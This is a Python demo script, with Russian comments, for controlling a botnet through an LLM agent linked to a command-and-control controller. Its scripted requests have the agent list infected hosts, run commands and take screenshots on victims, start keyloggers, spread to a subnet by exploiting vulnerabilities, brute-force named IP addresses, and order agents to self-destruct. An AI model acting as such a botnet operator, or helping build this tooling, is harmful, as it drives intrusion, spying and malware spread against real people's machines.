#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Демонстрационный скрипт управления ботнетом через LLM агента.
Показывает основные возможности интеграции C1Brain и C2Controller.
"""

import os
import sys
import json
import asyncio
import logging
from datetime import datetime

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='demo_botnet_control.log'
)
logger = logging.getLogger('BotnetDemo')

# Импортируем необходимые модули
from core.c1_brain import C1Brain
from core.c2_controller import C2Controller, C2API
from init_c2_integration import IntegrationManager, init_integration

# Примеры запросов для демонстрации
DEMO_REQUESTS = [
    # Базовые запросы
    "Покажи список всех агентов в ботнете",
    "Расскажи о возможностях агентов в ботнете",
    
    # Статистика и информация
    "Какова текущая статистика ботнета?",
    "Найди все Windows агенты в ботнете",
    "Найди агентов с возможностью keylogging",
    "Покажи информацию о заражениях",
    
    # Командование агентами
    "Выполни команду whoami на первом Windows-агенте",
    "Сделай скриншот с агента под Ubuntu",
    "Запусти кейлоггер на первом найденном агенте с этой возможностью на 10 минут",
    
    # Распространение
    "Запусти распространение на подсеть 192.168.1.0/24 используя технику эксплуатации уязвимостей",
    "Используй брутфорс для заражения целей 10.0.0.1, 10.0.0.2, 10.0.0.3",
    
    # Управление жизненным циклом
    "Обнови первого агента до последней версии",
    "Найди неактивных агентов и отправь им команду на самоуничтожение"
]

# Сценарий для демонстрации
DEMO_SCENARIO = [
    {
        "title": "1. Инициализация и базовая информация",
        "requests": [
            "Привет! Расскажи, что ты умеешь делать?",
            "Покажи список всех агентов в ботнете",
            "Какова текущая статистика ботнета?"
        ]
    },
    {
        "title": "2. Поиск и фильтрация агентов",
        "requests": [
            "Найди все агенты под управлением Windows",
            "Найди агентов с возможностью keylogging"
        ]
    },
    {
        "title": "3. Выполнение команд на агентах",
        "requests": [
            "Выбери первого Windows-агента и выполни на нем команду 'whoami'",
            "Найди агента под Linux и сделай скриншот его экрана"
        ]
    },
    {
        "title": "4. Распространение ботнета",
        "requests": [
            "Запусти распространение на подсеть 192.168.1.0/24",
            "Покажи статистику ботнета после распространения"
        ]
    },
    {
        "title": "5. Управление жизненным циклом агентов",
        "requests": [
            "Обнови все агенты до последней версии",
            "Найди неактивные агенты и выполни на них команду самоуничтожения",
            "Покажи окончательную статистику ботнета"
        ]
    }
]

async def run_demo_request(c1_brain: C1Brain, request: str) -> str:
    """
    Выполняет демонстрационный запрос и возвращает ответ
    
    Args:
        c1_brain: Экземпляр C1Brain
        request: Текст запроса
        
    Returns:
        Ответ агента
    """
    print(f"\nЗапрос: {request}")
    print("Обработка запроса...")
    
    try:
        response = await c1_brain.process_chat(request)
        print(f"Ответ агента: {response[:200]}..." if len(response) > 200 else f"Ответ агента: {response}")
        return response
    except Exception as e:
        error_msg = f"Ошибка при обработке запроса: {e}"
        logger.error(error_msg)
        print(f"Ошибка: {e}")
        return error_msg

async def run_demo_scenario(c1_brain: C1Brain):
    """
    Запускает демонстрационный сценарий
    
    Args:
        c1_brain: Экземпляр C1Brain
    """
    print("\n===== ДЕМОНСТРАЦИЯ УПРАВЛЕНИЯ БОТНЕТОМ =====\n")
    print(f"Время запуска: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Этот сценарий демонстрирует управление ботнетом через LLM агента")
    
    for i, section in enumerate(DEMO_SCENARIO, 1):
        print(f"\n\n===== {section['title']} =====")
        
        for request in section['requests']:
            await run_demo_request(c1_brain, request)
            await asyncio.sleep(1)  # Пауза для лучшего восприятия
    
    print("\n\n===== ДЕМОНСТРАЦИЯ ЗАВЕРШЕНА =====")

async def run_manual_demo(c1_brain: C1Brain):
    """
    Запускает интерактивную демонстрацию
    
    Args:
        c1_brain: Экземпляр C1Brain
    """
    print("\n===== ИНТЕРАКТИВНАЯ ДЕМОНСТРАЦИЯ УПРАВЛЕНИЯ БОТНЕТОМ =====\n")
    print("Введите запрос к агенту или одну из специальных команд:")
    print("  !help  - показать список примеров запросов")
    print("  !demo  - запустить автоматический демо-сценарий")
    print("  !exit  - завершить демонстрацию")
    
    while True:
        try:
            # Получаем ввод пользователя
            user_input = input("\n> ")
            
            # Обрабатываем специальные команды
            if user_input.lower() == "!exit":
                print("Завершение демонстрации...")
                break
                
            elif user_input.lower() == "!help":
                print("\nПримеры запросов:")
                for i, request in enumerate(DEMO_REQUESTS, 1):
                    print(f"  {i}. {request}")
                continue
                
            elif user_input.lower() == "!demo":
                await run_demo_scenario(c1_brain)
                continue
            
            # Обрабатываем запрос через C1Brain
            await run_demo_request(c1_brain, user_input)
            
        except KeyboardInterrupt:
            print("\nДемонстрация прервана пользователем")
            break
            
        except Exception as e:
            logger.error(f"Error in demo: {e}")
            print(f"Ошибка: {e}")

async def main():
    """Основная функция демонстрации"""
    print("Инициализация компонентов...")
    
    try:
        # Создаем компоненты
        c1_brain = C1Brain()
        c2_controller = C2Controller()
        
        # Инициализируем интеграцию
        integration = init_integration(c1_brain, c2_controller)
        
        print("Компоненты инициализированы успешно\n")
        
        # Запускаем интерактивную демонстрацию
        await run_manual_demo(c1_brain)
        
    except Exception as e:
        logger.error(f"Error in demo initialization: {e}")
        print(f"Ошибка при инициализации демонстрации: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    try:
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\nДемонстрация прервана пользователем")
        sys.exit(0) 